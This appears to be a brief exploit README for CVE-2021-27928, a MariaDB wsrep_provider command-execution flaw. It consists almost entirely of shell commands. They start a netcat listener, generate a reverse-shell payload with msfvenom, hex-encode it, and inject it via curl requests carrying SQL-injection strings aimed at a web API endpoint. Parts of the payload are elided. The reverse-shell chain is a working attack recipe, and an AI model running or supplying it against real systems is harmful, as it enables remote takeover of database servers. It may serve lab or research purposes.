# CVE-2021-27928 MariaDB 10.2 wsrep_provider OS Command Execution

```shell
$ nc -lvnp 4444
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf-so -o cve.so
$ python3 -c 'print(open("cve.so", "rb").read().hex())'
$ curl "https://localhost:8443/api/v1/resource/image-unsafe?s=abc...CUT...cve.so%27%3B%20%23"
$ curl "https://localhost:8443/api/v1/resource/image-unsafe?s=abc%...CUT...3B%20%23%20"
```

# Demo

Video demo [qui](https://videolink)
